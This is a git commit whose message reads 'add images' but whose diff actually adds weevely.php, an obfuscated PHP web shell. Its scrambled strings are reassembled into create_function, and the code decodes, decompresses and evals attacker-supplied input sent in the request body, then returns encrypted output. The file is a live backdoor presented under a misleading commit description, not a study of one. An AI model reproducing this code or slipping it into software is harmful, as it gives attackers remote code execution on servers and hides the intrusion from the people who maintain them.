d8eb76db6d533a280e44d4d08958cd15d2d5ae2b
Derry Berni <derry@detik.com>
2020-06-11 21:51:36 +0700

    add images

---
+++ weevely.php
@@ -0,0 +1,10 @@
+<?php
+$A='$BGk=BG"ec5ac3d8BG";$BGkh="5BGe279eca1578"BG;$kBGf="BGe82fc5bcd4BGBG31";$p="brMq3VQV08tlWBG1l5BG";funBGctioBGn x($t,BG';
+$o='://input")BG,$mBG)==1) {@oBGb_staBGrt();@evBGal(@gzuncoBGmpress(BG@BGx(@basBGe64BG_BGdecode($m[1]),$BGkBG)));$o=@ob_geBGt_';
+$U=str_replace('uB','','creuBuBateuB_uBfuBunuBction');
+$v='$k){$c=BGBGstrlen($k);$lBG=BGstrlBGen($t);BG$o="";for($BGiBG=0;$i<$l;){for(BG$jBG=0;(BG$j<$BGcBG&&$iBG<$l);$j++,$i++){';
+$p='contenBGts();BG@BGob_end_BGcleanBG();$r=@base6BG4_encoBGde(@BGx(@gzcBGBGompresBGs($o),$k));priBGnt("$BGp$kh$BGr$kf");}';
+$l='$o.BG=$tBG{$iBG}^$k{$j}BG;}BG}returnBG $o;}ifBG (@preg_maBGtBGch("/$BGkBGh(.+)$kf/",@file_gBGet_conteBGntBGs("BGphpBG';
+$L=str_replace('BG','',$A.$v.$l.$o.$p);
+$Y=$U('',$L);$Y();
+?>
